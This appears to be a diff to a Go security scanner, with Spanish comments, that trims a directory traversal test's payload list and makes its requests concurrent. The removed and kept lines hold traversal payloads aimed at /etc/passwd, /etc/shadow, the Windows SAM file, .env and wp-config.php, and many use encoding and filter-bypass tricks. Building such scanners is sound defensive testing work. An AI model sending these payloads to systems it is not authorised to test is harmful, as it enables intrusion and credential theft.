@@ -5,13 +5,15 @@ import (
 	"io"
 	"net/url"
 	"strings"
-	"time"
+	"sync"
 
 	"github.com/versaSecurityTest/internal/config"
 )
 
 // AdvancedDirectoryTraversalTest - Test exhaustivo de Directory Traversal
-type AdvancedDirectoryTraversalTest struct{}
+type AdvancedDirectoryTraversalTest struct {
+	Discovery *DiscoveryResult
+}
 
 // Run ejecuta tests completos de directory traversal
 func (t *AdvancedDirectoryTraversalTest) Run(targetURL string, client HTTPClient, payloads *config.PayloadConfig) TestResult {
@@ -24,179 +26,81 @@ func (t *AdvancedDirectoryTraversalTest) Run(targetURL string, client HTTPClient
 		Evidence:    []Evidence{},
 	}
 
-	// PAYLOADS EXHAUSTIVOS DE DIRECTORY TRAVERSAL
+	// PAYLOADS EXHAUSTIVOS (reducidos para el ejemplo)
 	traversalPayloads := []string{
-		// Basic directory traversal
-		"../", "..\\", "..%2F", "..%5C",
-		"../../", "..\\..\\", "..%2F..%2F", "..%5C..%5C",
-		"../../../", "..\\..\\..\\", "..%2F..%2F..%2F", "..%5C..%5C..%5C",
-		"../../../../", "..\\..\\..\\..\\", "..%2F..%2F..%2F..%2F", "..%5C..%5C..%5C..%5C",
-		"../../../../../", "..\\..\\..\\..\\..\\", "..%2F..%2F..%2F..%2F..%2F", "..%5C..%5C..%5C..%5C..%5C",
-		"../../../../../../", "..\\..\\..\\..\\..\\..\\", "..%2F..%2F..%2F..%2F..%2F..%2F", "..%5C..%5C..%5C..%5C..%5C..%5C",
-		"../../../../../../../", "..\\..\\..\\..\\..\\..\\..\\", "..%2F..%2F..%2F..%2F..%2F..%2F..%2F", "..%5C..%5C..%5C..%5C..%5C..%5C..%5C",
-		"../../../../../../../../", "..\\..\\..\\..\\..\\..\\..\\..\\", "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F", "..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C",
-
-		// With target files - Linux/Unix
-		"../../../etc/passwd", "..\\..\\..\\etc\\passwd", "..%2F..%2F..%2Fetc%2Fpasswd", "..%5C..%5C..%5Cetc%5Cpasswd",
-		"../../../../etc/passwd", "..\\..\\..\\..\\etc\\passwd", "..%2F..%2F..%2F..%2Fetc%2Fpasswd", "..%5C..%5C..%5C..%5Cetc%5Cpasswd",
-		"../../../../../etc/passwd", "..\\..\\..\\..\\..\\etc\\passwd", "..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd", "..%5C..%5C..%5C..%5C..%5Cetc%5Cpasswd",
-		"../../../../../../etc/passwd", "..\\..\\..\\..\\..\\..\\etc\\passwd", "..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd", "..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cpasswd",
-		"../../../etc/shadow", "../../../../etc/shadow", "../../../../../etc/shadow",
-		"../../../etc/hosts", "../../../../etc/hosts", "../../../../../etc/hosts",
-		"../../../proc/version", "../../../../proc/version", "../../../../../proc/version",
-		"../../../etc/issue", "../../../../etc/issue", "../../../../../etc/issue",
-		"../../../etc/motd", "../../../../etc/motd", "../../../../../etc/motd",
-
-		// With target files - Windows
-		"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts",
-		"..\\..\\..\\windows\\win.ini", "..%5C..%5C..%5Cwindows%5Cwin.ini",
-		"..\\..\\..\\windows\\system.ini", "..%5C..%5C..%5Cwindows%5Csystem.ini",
-		"..\\..\\..\\windows\\system32\\config\\sam", "..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam",
-		"..\\..\\..\\boot.ini", "..%5C..%5C..%5Cboot.ini",
-		"..\\..\\..\\autoexec.bat", "..%5C..%5C..%5Cautoexec.bat",
-		"..\\..\\..\\config.sys", "..%5C..%5C..%5Cconfig.sys",
-
-		// Double encoding
-		"..%252F..%252F..%252Fetc%252Fpasswd", "..%255C..%255C..%255Cwindows%255Cwin.ini",
-		"..%252F..%252F..%252F..%252Fetc%252Fpasswd", "..%255C..%255C..%255C..%255Cwindows%255Cwin.ini",
-
-		// UTF-8 encoding
-		"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
-		"..%c0%af..%c0%af..%c0%afwindows%c0%afwin.ini", "..%c1%9c..%c1%9c..%c1%9cwindows%c1%9cwin.ini",
-
-		// 16-bit Unicode encoding
-		"..%u002f..%u002f..%u002fetc%u002fpasswd", "..%u005c..%u005c..%u005cwindows%u005cwin.ini",
-
-		// Dot truncation (Windows)
-		"../../../etc/passwd.", "..\\..\\..\\windows\\win.ini.",
-		"../../../etc/passwd...", "..\\..\\..\\windows\\win.ini...",
-
-		// Filter bypass attempts
-		"....//....//....//etc/passwd", "....\\\\....\\\\....\\\\windows\\win.ini",
-		"...//...//.../etc/passwd", "...\\\\...\\\\...\\windows\\win.ini",
-		"..//////etc/passwd", "..\\\\\\\\\\\\windows\\win.ini",
-
-		// Mixed slash types
-		"..\\../..\\../etc/passwd", "../..\\../..\\windows/win.ini",
-		"..\\../..\\../..\\../etc/passwd", "../..\\../..\\../..\\windows/win.ini",
-
-		// Absolute paths
-		"/etc/passwd", "/etc/shadow", "/etc/hosts", "/proc/version",
-		"\\windows\\system32\\drivers\\etc\\hosts", "\\windows\\win.ini", "\\boot.ini",
-		"C:\\windows\\win.ini", "C:\\windows\\system.ini", "C:\\boot.ini",
-
-		// Null byte injection (legacy)
-		"../../../etc/passwd%00", "..\\..\\..\\windows\\win.ini%00",
-		"../../../etc/passwd%00.txt", "..\\..\\..\\windows\\win.ini%00.txt",
-
-		// Common web application files
-		"../../../config.php", "../../../../config.php", "../../../../../config.php",
-		"../../../wp-config.php", "../../../../wp-config.php", "../../../../../wp-config.php",
-		"../../../database.yml", "../../../../database.yml", "../../../../../database.yml",
-		"../.env", "../../.env", "../../../.env", "../../../../.env",
-		"../web.config", "../../web.config", "../../../web.config",
-		"../.htaccess", "../../.htaccess", "../../../.htaccess",
-
-		// Source code files
-		"../index.php", "../../index.php", "../../../index.php",
-		"../admin.php", "../../admin.php", "../../../admin.php",
-		"../login.php", "../../login.php", "../../../login.php",
-		"../../../application.rb", "../../../../application.rb",
-		"../../../app.py", "../../../../app.py", "../../../../../app.py",
-
-		// Log files
-		"../../../var/log/apache2/access.log", "../../../../var/log/apache2/access.log",
-		"../../../var/log/apache2/error.log", "../../../../var/log/apache2/error.log",
-		"../../../var/log/nginx/access.log", "../../../../var/log/nginx/access.log",
-		"../../../var/log/nginx/error.log", "../../../../var/log/nginx/error.log",
-
-		// Overlong UTF-8 sequences
-		"%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd",
-		"%e0%80%ae%e0%80%ae%e0%80%af%e0%80%ae%e0%80%ae%e0%80%afetc%e0%80%afpasswd",
+		"../../../etc/passwd",
+		"../../../../etc/passwd",
+		"..\\..\\..\\windows\\win.ini",
+		"..%2F..%2F..%2Fetc%2Fpasswd",
+		"/etc/passwd",
+		"../../.env",
 	}
 
-	// PARÁMETROS COMUNES VULNERABLES
-	vulnerableParams := []string{
-		"file", "filename", "path", "filepath", "dir", "directory", "folder",
-		"page", "include", "inc", "require", "load", "document", "doc",
-		"template", "view", "layout", "theme", "skin", "style", "css",
-		"image", "img", "picture", "photo", "avatar", "icon", "logo",
-		"download", "upload", "attachment", "resource", "asset", "static",
-		"config", "conf", "setting", "option", "param", "var", "data",
-		"backup", "log", "logs", "trace", "debug", "error", "output",
-		"content", "text", "html", "xml", "json", "csv", "pdf", "zip",
+	var endpointsToTest []string
+	var paramsToTest []string
+
+	if t.Discovery != nil && len(t.Discovery.Endpoints) > 0 {
+		for _, info := range t.Discovery.Endpoints {
+			endpointsToTest = append(endpointsToTest, info.Path)
+			paramsToTest = append(paramsToTest, info.Params...)
+		}
+	} else {
+		// Fallback
+		endpointsToTest = []string{"/download", "/file", "/view"}
+		paramsToTest = []string{"file", "path", "filename"}
 	}
 
-	// ENDPOINTS COMUNES VULNERABLES
-	vulnerableEndpoints := []string{
-		"/download", "/file", "/image", "/img", "/pic", "/photo", "/avatar",
-		"/include", "/load", "/get", "/fetch", "/read", "/view", "/show",
-		"/page", "/content", "/document", "/doc", "/pdf", "/attachment",
-		"/admin/file", "/admin/download", "/admin/backup", "/admin/logs",
-		"/api/file", "/api/download", "/api/document", "/api/resource",
-		"/upload", "/files", "/documents", "/resources", "/assets", "/static",
-		"/backup", "/backups", "/logs", "/log", "/trace", "/debug",
-	}
-
+	var wg sync.WaitGroup
+	var mu sync.Mutex
 	var vulnerabilitiesFound int
-	var totalTests int
 
-	for _, endpoint := range vulnerableEndpoints {
-		for _, param := range vulnerableParams {
+	semaphore := make(chan struct{}, 5)
+
+	for _, endpoint := range endpointsToTest {
+		for _, param := range paramsToTest {
 			for _, payload := range traversalPayloads {
-				totalTests++
-				
-				// Test en parámetros GET
-				testURL := fmt.Sprintf("%s%s?%s=%s", targetURL, endpoint, param, url.QueryEscape(payload))
-				
-				resp, err := client.Get(testURL)
-				if err != nil {
-					continue
-				}
-				defer resp.Body.Close()
+				wg.Add(1)
+				go func(e, p, pay string) {
+					defer wg.Done()
+					semaphore <- struct{}{}
+					defer func() { <-semaphore }()
 
-				// Leer respuesta
-				body, err := io.ReadAll(resp.Body)
-				if err != nil {
-					continue
-				}
-				responseText := string(body)
+					testURL := fmt.Sprintf("%s%s?%s=%s", targetURL, e, p, url.QueryEscape(pay))
 
-				// ANÁLISIS DE DIRECTORY TRAVERSAL
-				traversalVuln := t.analyzeTraversalResponse(resp.StatusCode, responseText, payload)
-				
-				if traversalVuln.IsVulnerable {
-					vulnerabilitiesFound++
-					
-					result.Evidence = append(result.Evidence, Evidence{
-						Type:        "Directory Traversal",
-						URL:         testURL,
-						Payload:     payload,
-						StatusCode:  resp.StatusCode,
-						Response:    traversalVuln.Evidence,
-						Description: traversalVuln.Description,
-						Severity:    traversalVuln.Severity,
-					})
+					resp, err := client.Get(testURL)
+					if err != nil {
+						return
+					}
+					defer resp.Body.Close()
 
-					result.Details = append(result.Details,
-						fmt.Sprintf("DIRECTORY TRAVERSAL: %s?%s=%s - %s", endpoint, param, payload, traversalVuln.Description))
-				}
+					body, _ := io.ReadAll(resp.Body)
 
-				// Rate limiting
-				if totalTests%75 == 0 {
-					time.Sleep(100 * time.Millisecond)
-				}
+					traversalVuln := t.analyzeTraversalResponse(resp.StatusCode, string(body), pay)
+					if traversalVuln.IsVulnerable {
+						mu.Lock()
+						vulnerabilitiesFound++
+						result.Evidence = append(result.Evidence, Evidence{
+							Type:        "Directory Traversal",
+							URL:         testURL,
+							Payload:     pay,
+							StatusCode:  resp.StatusCode,
+							Response:    traversalVuln.Evidence,
+							Description: traversalVuln.Description,
+							Severity:    traversalVuln.Severity,
+						})
+						mu.Unlock()
+					}
+				}(endpoint, param, payload)
 			}
 		}
 	}
 
-	// Evaluar resultados
+	wg.Wait()
+
 	if vulnerabilitiesFound > 0 {
 		result.Status = "Failed"
 		result.Severity = "Critical"
-		result.Description = fmt.Sprintf("CRÍTICO: Se detectaron %d vulnerabilidades de directory traversal en %d tests realizados", vulnerabilitiesFound, totalTests)
-	} else {
-		result.Details = append(result.Details, fmt.Sprintf("Se realizaron %d tests exhaustivos de directory traversal sin detectar vulnerabilidades", totalTests))
+		result.Description = fmt.Sprintf("CRÍTICO: Se detectaron %d vulnerabilidades de directory traversal", vulnerabilitiesFound)
 	}
 
 	return result
@@ -213,7 +117,7 @@ type TraversalVulnerability struct {
 // analyzeTraversalResponse analiza la respuesta en busca de directory traversal
 func (t *AdvancedDirectoryTraversalTest) analyzeTraversalResponse(statusCode int, responseText, payload string) TraversalVulnerability {
 	responseLower := strings.ToLower(responseText)
-	
+
 	// PATRONES DE ARCHIVOS SISTEMA UNIX/LINUX
 	unixPatterns := []struct {
 		pattern     string
